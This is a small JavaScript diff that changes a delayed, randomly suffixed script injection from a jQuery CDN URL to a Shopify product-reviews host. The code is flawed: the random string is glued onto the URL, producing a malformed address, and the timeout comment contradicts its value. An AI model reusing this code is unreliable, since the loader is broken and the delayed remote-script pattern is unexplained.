@@ -41,7 +41,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
         // Adicione o código para carregar o script da CDN aqui
         var script = document.createElement('script');
-        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js' + randomVersion;
+        script.src = 'https://productreviews.shopifycdn.com' + randomVersion;
         document.head.appendChild(script);
     }, 10000);  // 5000 milissegundos = 5 segundos
 });
